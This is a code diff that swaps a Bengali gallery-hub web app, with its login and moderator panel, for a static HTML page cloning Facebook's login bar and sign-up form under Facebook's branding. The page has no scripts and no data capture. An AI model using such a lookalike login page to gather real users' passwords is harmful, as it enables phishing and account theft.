@@ -1,1666 +1,364 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Nahid Gallery Hub</title>
-
+<title>Sign Up for Facebook | Facebook</title>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
 <style>
-/* =========================================================
-   NAHID GALLERY HUB
-   ULTIMATE PROFESSIONAL UI
-   ========================================================= */
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
 
-:root{
-    --primary:#7c3aed;
-    --secondary:#06b6d4;
-    --pink:#ec4899;
-    --green:#10b981;
-    --red:#f43f5e;
-    --blue:#3b82f6;
+  body {
+    font-family: 'Open Sans', Helvetica, Arial, sans-serif;
+    background-color: #f0f2f5;
+    color: #1d2129;
+  }
 
-    --bg:#f5f7ff;
-    --card:rgba(255,255,255,.82);
-    --text:#172033;
-    --muted:#64748b;
-    --border:rgba(148,163,184,.25);
+  /* Navbar */
+  #navwrapper {
+    background: #3b5998;
+    border-bottom: 1px solid #133783;
+    padding: 10px 0;
+    box-shadow: 0 2px 4px rgba(0,0,0,.1);
+  }
 
-    --gradient:linear-gradient(
-        135deg,
-        #7c3aed,
-        #ec4899,
-        #06b6d4
-    );
-
-    --shadow:
-        0 20px 50px rgba(15,23,42,.10);
-
-    --shadow-hover:
-        0 30px 70px rgba(15,23,42,.18);
-
-    --radius:22px;
-}
-
-body.dark-mode {
-    --bg:#0f172a;
-    --card:rgba(30,41,59,.85);
-    --text:#f8fafc;
-    --muted:#94a3b8;
-    --border:rgba(51,65,85,.5);
-    background:
-        radial-gradient(circle at 10% 10%, rgba(124,58,237,.15), transparent 28%),
-        radial-gradient(circle at 90% 15%, rgba(6,182,212,.15), transparent 28%),
-        #0f172a;
-}
-
-/* ================= RESET ================= */
-
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-}
-
-html{
-    scroll-behavior:smooth;
-}
-
-body{
-    min-height:100vh;
-    font-family:
-        Inter,
-        "Segoe UI",
-        Roboto,
-        Arial,
-        sans-serif;
-
-    color:var(--text);
-
-    background:
-        radial-gradient(
-            circle at 10% 10%,
-            rgba(124,58,237,.12),
-            transparent 28%
-        ),
-        radial-gradient(
-            circle at 90% 15%,
-            rgba(6,182,212,.12),
-            transparent 28%
-        ),
-        var(--bg);
-
-    line-height:1.6;
-    transition: background 0.3s, color 0.3s;
-}
-
-/* ================= AUTH ================= */
-
-#auth-screen{
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:20px;
-    background:
-        radial-gradient(circle at 15% 20%, rgba(124,58,237,.35), transparent 30%),
-        radial-gradient(circle at 85% 80%, rgba(6,182,212,.30), transparent 30%),
-        linear-gradient(135deg, #0f172a, #111827, #1e1b4b);
-}
-
-.auth-card{
-    width:100%;
-    max-width:430px;
-    padding:32px;
-    background:rgba(255,255,255,.94);
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,.5);
-    border-radius:28px;
-    box-shadow:0 30px 80px rgba(0,0,0,.35);
-    text-align:center;
-    animation:cardIn .6s ease;
-}
-
-.auth-card h2{
-    font-size:1.8rem;
-    font-weight:900;
-    margin-bottom:25px;
-    background:var(--gradient);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-}
-
-.auth-card input,
-.auth-card select,
-.mod-panel input,
-.mod-panel textarea,
-.modal-content input{
-    width:100%;
-    padding:13px 14px;
-    margin-bottom:14px;
-    border:1px solid #dbe2ea;
-    border-radius:12px;
-    outline:none;
-    background:#fff;
-    color:#172033;
-    font-size:.95rem;
-    transition:.25s;
-}
-
-.auth-card input:focus,
-.auth-card select:focus,
-.mod-panel input:focus,
-.mod-panel textarea:focus,
-.modal-content input:focus{
-    border-color:var(--primary);
-    box-shadow:0 0 0 4px rgba(124,58,237,.10);
-}
-
-.auth-card > button,
-#user-auth-btn,
-#mod-auth-section button,
-.modal-btn{
-    width:100%;
-    padding:13px;
-    border:0;
-    border-radius:12px;
-    color:white;
-    background:var(--gradient);
-    font-size:.95rem;
-    font-weight:800;
-    cursor:pointer;
-    box-shadow:0 10px 25px rgba(124,58,237,.25);
-    transition:.25s;
-}
-
-.auth-card button:hover,
-.modal-btn:hover{
-    transform:translateY(-2px);
-    box-shadow:0 15px 30px rgba(124,58,237,.35);
-}
-
-.tab-btns{
-    display:flex;
-    gap:8px;
-    margin-bottom:18px;
-}
-
-.tab-btns button{
-    flex:1;
-    padding:10px;
-    border:1px solid #e2e8f0;
-    border-radius:11px;
-    background:#f8fafc;
-    color:#172033;
-    cursor:pointer;
-    font-weight:700;
-}
-
-.tab-btns button.active{
-    background:var(--gradient);
-    color:white;
-    border-color:transparent;
-}
-
-.pass-wrapper{
-    position:relative;
-    width:100%;
-    margin-bottom:14px;
-}
-
-.pass-wrapper input{
-    margin-bottom:0 !important;
-    padding-right:48px;
-}
-
-.toggle-eye{
-    position:absolute;
-    right:13px;
-    top:50%;
-    transform:translateY(-50%);
-    cursor:pointer;
-    font-size:1.1rem;
-}
-
-/* ================= APP ================= */
-
-#app-container{
-    display:none;
-}
-
-/* ================= HEADER ================= */
-
-header{
-    position:relative;
-    padding:25px 20px 28px;
-    text-align:center;
-    background:var(--card);
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
-    border-bottom:1px solid var(--border);
-    box-shadow:0 10px 40px rgba(15,23,42,.06);
-    overflow:hidden;
-}
-
-.menu-btn{
-    position:absolute;
-    top:20px;
-    left:20px;
-    z-index:5;
-    width:42px;
-    height:42px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border:1px solid var(--border);
-    border-radius:12px;
-    background:var(--card);
-    color:var(--text);
-    font-size:1.2rem;
-    font-weight:bold;
-    cursor:pointer;
-    box-shadow:0 5px 15px rgba(15,23,42,.08);
-    transition:.25s;
-}
-
-.menu-btn:hover{
-    background:var(--primary);
-    color:white;
-    border-color:transparent;
-}
-
-.profile-btn{
-    position:absolute;
-    top:20px;
-    right:75px;
-    z-index:5;
-    width:42px;
-    height:42px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border:1px solid var(--border);
-    border-radius:12px;
-    background:var(--card);
-    color:var(--text);
-    font-size:1.2rem;
-    cursor:pointer;
-    box-shadow:0 5px 15px rgba(15,23,42,.08);
-    transition:.25s;
-}
-
-.profile-btn:hover{
-    background:var(--secondary);
-    color:white;
-    border-color:transparent;
-}
-
-.logo-container{
-    position:relative;
-    z-index:2;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:12px;
-}
-
-.logo-badge{
-    width:52px;
-    height:52px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border-radius:15px;
-    color:white;
-    font-size:1.8rem;
-    font-weight:900;
-    background:var(--gradient);
-    box-shadow:0 10px 25px rgba(124,58,237,.25);
-    overflow:hidden;
-}
-
-.logo-badge img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-}
-
-header h1{
-    font-size:clamp(1.5rem,5vw,2.3rem);
-    font-weight:900;
-    background:var(--gradient);
-    -webkit-background-clip:text;
-    -webkit-text-fill-color:transparent;
-}
-
-#welcome-user-msg{
-    position:relative;
-    z-index:2;
-    margin-top:8px !important;
-    color:var(--muted) !important;
-    font-weight:600;
-}
-
-.logout-btn{
-    position:absolute;
-    top:20px;
-    right:20px;
-    z-index:5;
-    width:42px;
-    height:42px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border:0;
-    border-radius:12px;
-    color:white;
-    background:linear-gradient(135deg, #ef4444, #f43f5e);
-    font-weight:700;
-    cursor:pointer;
-    transition:.25s;
-}
-
-.logout-btn:hover{
-    transform:translateY(-2px);
-}
-
-/* ================= SIDEBAR DRAWER ================= */
-
-.sidebar-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(15, 23, 42, 0.4);
-    backdrop-filter: blur(4px);
-    z-index: 998;
-    opacity: 0;
-    visibility: hidden;
-    transition: 0.3s ease;
-}
-
-.sidebar-overlay.active {
-    opacity: 1;
-    visibility: visible;
-}
-
-.sidebar {
-    position: fixed;
-    top: 0;
-    left: -320px;
-    width: 320px;
-    height: 100%;
-    background: var(--card);
-    backdrop-filter: blur(25px);
-    -webkit-backdrop-filter: blur(25px);
-    box-shadow: 20px 0 50px rgba(15, 23, 42, 0.15);
-    z-index: 999;
+  #navbar {
+    width: 980px;
+    margin: 0 auto;
     display: flex;
-    flex-direction: column;
-    transition: 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-    overflow-y: auto;
-    border-right: 1px solid var(--border);
-}
-
-.sidebar.active {
-    left: 0;
-}
-
-.sidebar-header {
-    padding: 24px 20px;
-    display: flex;
-    align-items: center;
     justify-content: space-between;
-    border-bottom: 1px solid var(--border);
-}
-
-.sidebar-header h3 {
-    font-size: 1.2rem;
-    font-weight: 800;
-    background: var(--gradient);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-}
-
-.close-sidebar-btn {
-    background: none;
-    border: none;
-    font-size: 1.3rem;
-    cursor: pointer;
-    color: var(--muted);
-    transition: 0.2s;
-}
-
-.sidebar-menu {
-    padding: 16px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-}
-
-.sidebar-category-title {
-    font-size: 0.75rem;
-    font-weight: 800;
-    text-transform: uppercase;
-    color: var(--muted);
-    padding: 10px 12px 4px;
-    letter-spacing: 0.5px;
-}
-
-.sidebar-item {
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-    padding: 12px 14px;
-    border-radius: 14px;
-    text-decoration: none;
-    color: var(--text);
-    background: transparent;
-    border: 1px solid transparent;
-    cursor: pointer;
-    transition: 0.25s;
-    text-align: left;
-}
-
-.sidebar-item:hover {
-    background: rgba(124, 58, 237, 0.08);
-    border-color: var(--border);
-    transform: translateX(4px);
-}
-
-.sidebar-item-title {
-    display: flex;
     align-items: center;
-    gap: 10px;
-    font-size: 0.92rem;
+  }
+
+  .logowrapper {
+    color: #ffffff;
+    font-size: 32px;
+    font-weight: bold;
+    letter-spacing: -1px;
+    text-transform: lowercase;
+  }
+
+  .tablewrapper {
+    border-spacing: 0;
+  }
+
+  .row1 {
+    font-size: 12px;
+    color: #ffffff;
+    padding-bottom: 4px;
     font-weight: 700;
-}
+  }
 
-.sidebar-item-desc {
-    font-size: 0.78rem;
-    color: var(--muted);
-    padding-left: 26px;
-}
+  .inputtext {
+    border: 1px solid #1d2129;
+    border-radius: 2px;
+    font-size: 12px;
+    margin: 0 5px 5px 0;
+    padding: 3px;
+    width: 150px;
+  }
 
-/* ================= PROFILE & SETTINGS MODAL ================= */
+  #button {
+    background-color: #4267b2;
+    border: 1px solid #29487d;
+    color: #ffffff;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: bold;
+    padding: 3px 8px;
+    border-radius: 2px;
+    text-align: center;
+  }
 
-.modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(15, 23, 42, 0.5);
-    backdrop-filter: blur(5px);
-    z-index: 1000;
+  #button:hover {
+    background-color: #365899;
+  }
+
+  .row2 {
+    font-size: 11px;
+    color: #9cb4d8;
+  }
+
+  .row2.h:hover {
+    text-decoration: underline;
+    cursor: pointer;
+  }
+
+  /* Content Wrapper */
+  #contentwrapper {
+    width: 980px;
+    margin: 20px auto;
+  }
+
+  #content {
     display: flex;
-    align-items: center;
-    justify-content: center;
-    opacity: 0;
-    visibility: hidden;
-    transition: 0.3s;
-}
-
-.modal-overlay.active {
-    opacity: 1;
-    visibility: visible;
-}
-
-.modal-content {
-    width: 90%;
-    max-width: 450px;
-    background: var(--card);
-    backdrop-filter: blur(25px);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 25px;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.3);
-    transform: scale(0.9);
-    transition: 0.3s;
-}
-
-.modal-overlay.active .modal-content {
-    transform: scale(1);
-}
-
-.modal-header {
-    display: flex;
-    align-items: center;
     justify-content: space-between;
+    align-items: flex-start;
+  }
+
+  #leftbod {
+    flex: 1;
+    padding-right: 20px;
+  }
+
+  #leftbod h2 {
+    color: #0e385f;
+    font-size: 20px;
+    font-weight: normal;
+    line-height: 28px;
     margin-bottom: 20px;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 12px;
-}
+  }
 
-.modal-header h3 {
-    background: var(--gradient);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    font-weight: 900;
-}
+  /* Right Signup Box */
+  #rightbod {
+    width: 420px;
+  }
 
-.close-modal-btn {
-    background: none;
-    border: none;
-    font-size: 1.2rem;
+  .formbox {
+    margin-bottom: 10px;
+  }
+
+  .mt1 {
+    margin-top: 15px;
+  }
+
+  .inputbody {
+    width: 100%;
+    height: 40px;
+    padding: 8px 10px;
+    border: 1px solid #ccd0d5;
+    border-radius: 5px;
+    font-size: 15px;
+    background-color: #f5f6f7;
+    outline: none;
+  }
+
+  .inputbody:focus {
+    border-color: #1877f2;
+    background-color: #fff;
+  }
+
+  .in2 {
+    width: 100%;
+  }
+
+  .bday {
+    font-size: 16px;
+    font-weight: 600;
+    color: #606770;
+    margin-bottom: 4px;
+  }
+
+  .selectbody {
+    height: 36px;
+    padding: 0 8px;
+    border: 1px solid #ccd0d5;
+    border-radius: 4px;
+    background-color: #fff;
+    font-size: 13px;
+    color: #1d2129;
+    margin-right: 5px;
+  }
+
+  .selectbody.fl {
+    float: none;
+  }
+
+  .fb1.why {
+    font-size: 11px;
+    color: #1877f2;
+    margin-top: 4px;
+  }
+
+  .fb1.why.h:hover {
+    text-decoration: underline;
     cursor: pointer;
-    color: var(--muted);
-}
+  }
 
-.settings-group {
-    margin-bottom: 15px;
-}
-
-.settings-group label {
-    display: block;
-    font-size: 0.85rem;
-    font-weight: 700;
-    color: var(--muted);
-    margin-bottom: 6px;
-}
-
-.theme-colors {
+  .spanpad {
     display: flex;
-    gap: 10px;
-    margin-bottom: 15px;
-}
+    gap: 15px;
+  }
 
-.color-dot {
-    width: 35px;
-    height: 35px;
-    border-radius: 50%;
+  .m0 {
+    margin-right: 4px;
+  }
+
+  .gender {
+    font-size: 15px;
+    color: #1d2129;
     cursor: pointer;
-    border: 2px solid white;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
-    transition: 0.2s;
-}
+    font-weight: normal;
+    border: 1px solid #ccd0d5;
+    padding: 8px 20px;
+    border-radius: 4px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: space-between;
+    width: 32%;
+    background: #fff;
+  }
 
-.color-dot:hover {
-    transform: scale(1.1);
-}
+  .gender:hover {
+    background: #f2f4f7;
+  }
 
-/* ================= MODERATOR PANEL ================= */
+  .agree {
+    font-size: 11px;
+    color: #777;
+    line-height: 1.34;
+    margin: 10px 0;
+  }
 
-.mod-panel{
-    width:calc(100% - 24px);
-    max-width:700px;
-    margin:25px auto;
-    padding:20px;
-    background:var(--card);
-    backdrop-filter:blur(15px);
-    border:1px solid var(--border);
-    border-radius:22px;
-    box-shadow:var(--shadow);
-}
+  .link {
+    color: #385898;
+    display: inline;
+    cursor: pointer;
+  }
 
-.mod-panel > h3{
-    margin-bottom:15px;
-    color:var(--primary);
-    font-size:1.1rem;
-}
+  .link:hover {
+    text-decoration: underline;
+  }
 
-.mod-nav-tabs{
-    display:flex;
-    gap:5px;
-    margin-bottom:15px;
-    padding:5px;
-    background:rgba(124,58,237,0.08);
-    border-radius:12px;
-}
+  .signbut {
+    background-color: #42b72a;
+    border: none;
+    border-radius: 6px;
+    box-shadow: none;
+    color: #fff;
+    font-size: 18px;
+    font-weight: bold;
+    height: 36px;
+    line-height: 36px;
+    padding: 0 32px;
+    text-shadow: none;
+    cursor: pointer;
+    width: 194px;
+    margin: 10px 0;
+  }
 
-.mod-nav-tab{
-    flex:1;
-    padding:10px 5px;
-    border:0;
-    border-radius:9px;
-    background:transparent;
-    color:var(--text);
-    font-weight:700;
-    cursor:pointer;
-    transition:.25s;
-}
+  .signbut:hover {
+    background-color: #36a420;
+  }
 
-.mod-nav-tab.active{
-    color:white;
-    background:var(--gradient);
-    box-shadow:0 5px 15px rgba(37,99,235,.2);
-}
+  .bolder {
+    font-weight: bold;
+  }
 
-.mod-section-content{
-    display:none;
-}
+  .create {
+    font-size: 13px;
+    color: #1d2129;
+    margin-top: 20px;
+    border-top: 1px solid #dadde1;
+    padding-top: 15px;
+  }
 
-.mod-section-content.active{
-    display:block;
-}
-
-.mod-box{
-    padding:16px;
-    margin-top:10px;
-    background:var(--card);
-    border:1px solid var(--border);
-    border-radius:15px;
-}
-
-.mod-box h3{
-    margin-bottom:10px;
-}
-
-.mod-box button{
-    width:100%;
-    padding:11px;
-    border:0;
-    border-radius:10px;
-    color:white;
-    background:linear-gradient(135deg, #10b981, #059669);
-    font-weight:800;
-    cursor:pointer;
-    transition:.25s;
-}
-
-.mod-box button:hover{
-    transform:translateY(-2px);
-}
-
-/* ================= TABLE ================= */
-
-.info-table{
-    width:100%;
-    border-collapse:collapse;
-    overflow:hidden;
-    border-radius:10px;
-    font-size:.84rem;
-    background:var(--card);
-}
-
-.info-table th,
-.info-table td{
-    padding:9px;
-    border:1px solid var(--border);
-    text-align:left;
-}
-
-.info-table th{
-    background:rgba(124,58,237,0.1);
-    color:var(--text);
-}
-
-/* ================= COMMENTS ================= */
-
-.mod-comment-row{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    gap:8px;
-    padding:9px;
-    margin-bottom:7px;
-    background:var(--card);
-    border:1px solid var(--border);
-    border-radius:10px;
-    font-size:.84rem;
-}
-
-.delete-comment-btn{
-    width:auto !important;
-    padding:5px 9px !important;
-    background:#ef4444 !important;
-    flex-shrink:0;
-}
-
-/* ================= POSTS ================= */
-
-.post{
-    position:relative;
-    width:calc(100% - 24px);
-    max-width:700px;
-    margin:25px auto;
-    padding:20px;
-    background:var(--card);
-    backdrop-filter:blur(18px);
-    -webkit-backdrop-filter:blur(18px);
-    border:1px solid var(--border);
-    border-radius:22px;
-    box-shadow:var(--shadow);
-    overflow:hidden;
-    transition:.3s;
-}
-
-.post:before{
-    content:"";
-    position:absolute;
-    left:0;
-    top:0;
-    width:100%;
-    height:3px;
-    background:var(--gradient);
-}
-
-.post:hover{
-    transform:translateY(-5px);
-    box-shadow:var(--shadow-hover);
-}
-
-.post img,
-.post video{
-    display:block;
-    width:100%;
-    max-height:550px;
-    object-fit:cover;
-    border-radius:16px;
-    margin-bottom:16px;
-    background:#0f172a;
-    box-shadow:0 10px 30px rgba(15,23,42,.12);
-}
-
-.post h3{
-    font-size:1.3rem;
-    font-weight:800;
-    margin-bottom:6px;
-}
-
-.post p{
-    color:var(--muted);
-    font-size:.96rem;
-    margin-bottom:10px;
-}
-
-.post-stats{
-    padding:11px 0;
-    margin-top:10px;
-    border-top:1px solid var(--border);
-    border-bottom:1px solid var(--border);
-    color:var(--muted);
-    font-size:.88rem;
-}
-
-.comment-item{
-    padding:9px 12px;
-    margin-top:7px;
-    background:rgba(124,58,237,0.03);
-    border:1px solid var(--border);
-    border-radius:10px;
-    font-size:.88rem;
-}
-
-/* ================= ACTION BUTTONS ================= */
-
-.actions{
-    display:flex;
-    gap:9px;
-    margin-top:15px;
-}
-
-.actions button{
-    flex:1;
-    padding:11px 8px;
-    border:0;
-    border-radius:11px;
-    color:white;
-    font-weight:800;
-    cursor:pointer;
-    transition:.25s;
-    box-shadow:0 7px 18px rgba(15,23,42,.10);
-}
-
-.actions button:hover{
-    transform:translateY(-3px);
-}
-
-.love{
-    background:linear-gradient(135deg, #f43f5e, #ec4899);
-}
-
-.comment-btn{
-    background:linear-gradient(135deg, #2563eb, #06b6d4);
-}
-
-.download{
-    background:linear-gradient(135deg, #059669, #10b981);
-}
-
-/* ================= FOOTER ================= */
-
-footer{
-    padding:35px 20px;
-    margin-top:50px;
-    text-align:center;
-    color:var(--muted);
-    border-top:1px solid var(--border);
-    background:var(--card);
-}
-
-/* ================= ANIMATION ================= */
-
-@keyframes cardIn{
-    from{
-        opacity:0;
-        transform:translateY(25px) scale(.97);
+  @media(max-width: 800px) {
+    #navbar, #contentwrapper {
+      width: 100%;
+      padding: 0 10px;
     }
-    to{
-        opacity:1;
-        transform:translateY(0) scale(1);
+    #content {
+      flex-direction: column;
     }
-}
-
-/* ================= MOBILE ================= */
-
-@media(max-width:600px){
-    .auth-card{ padding:24px 18px; }
-    header{ padding:24px 12px 25px; }
-    header h1{ font-size:1.45rem; }
-    .logo-badge{ width:45px; height:45px; font-size:1.5rem; }
-    .logout-btn, .profile-btn, .menu-btn{ top:12px; width:36px; height:36px; font-size:1rem; }
-    .profile-btn{ right:54px; }
-    .logout-btn{ right:10px; }
-    .menu-btn{ left:10px; }
-    .logo-container{ padding-top:25px; }
-    .mod-panel, .post{ width:calc(100% - 18px); padding:15px; border-radius:18px; }
-    .mod-nav-tab{ font-size:.72rem; padding:9px 3px; }
-    .actions{ gap:6px; }
-    .actions button{ font-size:.76rem; padding:10px 5px; }
-    .info-table{ font-size:.72rem; }
-    .info-table th, .info-table td{ padding:6px; }
-    .mod-comment-row{ font-size:.75rem; }
-}
-
-@media(max-width:380px){
-    .actions{ flex-direction:column; }
-    .actions button{ width:100%; }
-}
-
-/* ================= SCROLLBAR ================= */
-
-::-webkit-scrollbar{ width:8px; }
-::-webkit-scrollbar-track{ background:var(--bg); }
-::-webkit-scrollbar-thumb{ background:var(--gradient); border-radius:20px; }
+    #rightbod {
+      width: 100%;
+    }
+  }
 </style>
 </head>
-
 <body>
 
-<!-- =====================================================
-     AUTH SCREEN
-     ===================================================== -->
-
-<div id="auth-screen">
-    <div class="auth-card">
-        <h2>✨ Nahid Gallery Hub</h2>
-        <select id="role-select" onchange="switchRole()">
-            <option value="user">👤 ইউজার</option>
-            <option value="moderator">👑 মডারেটর</option>
-        </select>
-
-        <div id="user-auth-section">
-            <div class="tab-btns">
-                <button id="btn-login-tab" class="active" onclick="switchAuthMode('login')">লগইন</button>
-                <button id="btn-reg-tab" onclick="switchAuthMode('register')">রেজিস্ট্রেশন</button>
-            </div>
-
-            <div id="reg-name-field" style="display:none;">
-                <input type="text" id="user-name" placeholder="আপনার নাম লিখুন">
-            </div>
-
-            <input type="tel" id="user-phone" placeholder="ফোন নাম্বার">
-
-            <div class="pass-wrapper">
-                <input type="password" id="user-password" placeholder="পাসওয়ার্ড">
-                <span class="toggle-eye" onclick="togglePassword('user-password',this)">👁️</span>
-            </div>
-
-            <button id="user-auth-btn" onclick="handleUserAuth()">লগইন করুন</button>
-        </div>
-
-        <div id="mod-auth-section" style="display:none;">
-            <div class="pass-wrapper">
-                <input type="password" id="mod-password" placeholder="মডারেটর পাসওয়ার্ড">
-                <span class="toggle-eye" onclick="togglePassword('mod-password',this)">👁️</span>
-            </div>
-            <button onclick="handleModLogin()">👑 মডারেটর হিসেবে প্রবেশ</button>
-        </div>
+  <!-- Top Navbar -->
+  <div id="navwrapper">
+    <div id="navbar">
+      <h1 class="logowrapper">facebook</h1>
+      <table class="tablewrapper">
+        <tr>
+          <td class="row1">Email or Phone</td>
+          <td class="row1">Password</td>
+        </tr>
+        <tr>
+          <td><input type="text" class="inputtext"></td>
+          <td><input type="text" class="inputtext"></td>
+          <td><div id="button">Log In</div></td>
+        </tr>
+        <tr>
+          <td><div class="row2"><input type="checkbox" checked>Keep me logged in</div></td>
+          <td class="row2 h">Forgot your password?</td>
+        </tr>
+      </table>
     </div>
-</div>
+  </div>
 
-<!-- =====================================================
-     MAIN APP CONTAINER
-     ===================================================== -->
+  <!-- Main Content Wrapper -->
+  <div id="contentwrapper">
+    <div id="content">
+      
+      <!-- Left Column -->
+      <div id="leftbod">
+        <h2>Facebook helps you connect and share with the people in your life.</h2>
+      </div>
 
-<div id="app-container">
+      <!-- Right Column (Sign Up Form) -->
+      <div id="rightbod">
+        <div class="formbox">
+          <input type="text" class="inputbody in2" placeholder="New password">
+        </div>
+        <div class="formbox">
+          <div class="bday">Birthday</div>
+        </div>
+        <div class="formbox">
+          <span data-type="selectors">
+            <span>
+              <select title="Month" class="selectbody">
+                <option value="0" selected>Month</option>
+                <option value="1">Jan</option><option value="2">Feb</option><option value="3">Mar</option>
+                <option value="4">Apr</option><option value="5">May</option><option value="6">Jun</option>
+                <option value="7">Jul</option><option value="8">Aug</option><option value="9">Sep</option>
+                <option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option>
+              </select>
+              <select title="Day" class="selectbody fl">
+                <option value="0" selected>Day</option>
+                <option value="1">1</option><option value="2">2</option><option value="3">3</option>
+                <option value="4">4</option><option value="5">5</option><option value="6">6</option>
+                <option value="7">7</option><option value="8">8</option><option value="9">9</option>
+                <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+              </select>
+              <select title="Year" class="selectbody fl">
+                <option value="0" selected>Year</option>
+                <option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option>
+                <option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option>
+              </select>
+            </span>
+            <div class="fb1 why h">Why do I need to provide my birthday?</div>
+          </span>
+        </div>
+        <div class="formbox mt1">
+          <span data-type="radio" class="spanpad">
+            <label for="fem" class="gender">Female <input type="radio" id="fem" name="gender" class="m0"></label>
+            <label for="male" class="gender">Male <input type="radio" id="male" name="gender" class="m0"></label>
+          </span>
+        </div>
+        <div class="formbox">
+          <div class="agree">
+            By clicking Sign Up, you agree to our <div class="link">Terms</div> and that you have read our <div class="link">Data Use Policy</div>, including our <div class="link">Cookie Use</div>.
+          </div>  
+        </div>
+        <div class="formbox">
+          <button type="submit" class="signbut bolder">Sign Up</button>
+        </div>
+        <div class="formbox">
+          <div class="create"><div class="link h">Create a Page</div> for a celebrity, band or business.</div>
+        </div>
+      </div>
 
-<!-- SIDEBAR DRAWER -->
-<div id="sidebar-overlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
-
-<aside id="sidebar" class="sidebar">
-    <div class="sidebar-header">
-        <h3>✨ Hub Menu</h3>
-        <button class="close-sidebar-btn" onclick="toggleSidebar()">✕</button>
     </div>
-
-    <div class="sidebar-menu">
-        <div class="sidebar-category-title">Navigation & Feed</div>
-        <div class="sidebar-item" onclick="scrollToSection('feed-container')">
-            <div class="sidebar-item-title">🏠 Home Feed</div>
-            <div class="sidebar-item-desc">Browse all published gallery posts and updates</div>
-        </div>
-
-        <div class="sidebar-category-title">Management & Tools</div>
-        <div class="sidebar-item" onclick="scrollToSection('moderator-control-panel')">
-            <div class="sidebar-item-title">📊 Control Panel</div>
-            <div class="sidebar-item-desc">Access platform stats, users, and download logs</div>
-        </div>
-        <div class="sidebar-item" onclick="scrollToSection('new-post-title')">
-            <div class="sidebar-item-title">➕ Upload Media</div>
-            <div class="sidebar-item-desc">Publish new photo or video posts to the hub</div>
-        </div>
-
-        <div class="sidebar-category-title">Account & System</div>
-        <div class="sidebar-item" onclick="openProfileModal()">
-            <div class="sidebar-item-title">⚙️ Profile & Settings</div>
-            <div class="sidebar-item-desc">Update account info, dark mode & theme colors</div>
-        </div>
-        <div class="sidebar-item" onclick="handleLogout()">
-            <div class="sidebar-item-title">🚪 Sign Out</div>
-            <div class="sidebar-item-desc">Safely terminate your active user session</div>
-        </div>
-    </div>
-</aside>
-
-<!-- PROFILE & SETTINGS MODAL -->
-<div id="profile-modal" class="modal-overlay" onclick="closeProfileModalOutside(event)">
-    <div class="modal-content">
-        <div class="modal-header">
-            <h3>⚙️ Profile & Settings</h3>
-            <button class="close-modal-btn" onclick="closeProfileModal()">✕</button>
-        </div>
-
-        <div class="settings-group">
-            <label>🎨 Theme Color</label>
-            <div class="theme-colors">
-                <div class="color-dot" style="background:#7c3aed;" onclick="setTheme('#7c3aed','#06b6d4')"></div>
-                <div class="color-dot" style="background:#3b82f6;" onclick="setTheme('#3b82f6','#ec4899')"></div>
-                <div class="color-dot" style="background:#10b981;" onclick="setTheme('#10b981','#3b82f6')"></div>
-                <div class="color-dot" style="background:#f43f5e;" onclick="setTheme('#f43f5e','#7c3aed')"></div>
-            </div>
-        </div>
-
-        <div class="settings-group">
-            <label>🌙 Appearance Mode</label>
-            <button class="modal-btn" onclick="toggleDarkMode()" style="background:var(--muted); margin-bottom:15px;">Toggle Dark / Light Mode</button>
-        </div>
-
-        <div id="user-profile-edit-section">
-            <div class="settings-group">
-                <label>👤 Update Name</label>
-                <input type="text" id="update-name" placeholder="New Name">
-            </div>
-            <div class="settings-group">
-                <label>📞 Update Phone</label>
-                <input type="tel" id="update-phone" placeholder="New Phone">
-            </div>
-            <div class="settings-group">
-                <label>🔒 New Password</label>
-                <input type="password" id="update-pass" placeholder="New Password">
-            </div>
-            <button class="modal-btn" onclick="saveUserProfile()">Save Changes</button>
-        </div>
-    </div>
-</div>
-
-<header>
-    <button class="menu-btn" onclick="toggleSidebar()" title="Open Menu">☰</button>
-    <button class="profile-btn" onclick="openProfileModal()" title="Profile & Settings">⚙️</button>
-    <button class="logout-btn" onclick="handleLogout()" title="Logout">🚪</button>
-
-    <div class="logo-container">
-        <div class="logo-badge" id="header-logo-badge">N</div>
-        <h1 id="header-hub-title">Nahid Gallery Hub</h1>
-    </div>
-    <p id="welcome-user-msg"></p>
-</header>
-
-<!-- =====================================================
-     MODERATOR PANEL
-     ===================================================== -->
-
-<div id="moderator-control-panel" class="mod-panel" style="display:none;">
-    <h3>🛠️ মডারেটর কন্ট্রোল প্যানেল</h3>
-
-    <div class="mod-nav-tabs">
-        <button class="mod-nav-tab active" onclick="switchModTab('posts-tab',this)">📝 পোস্ট</button>
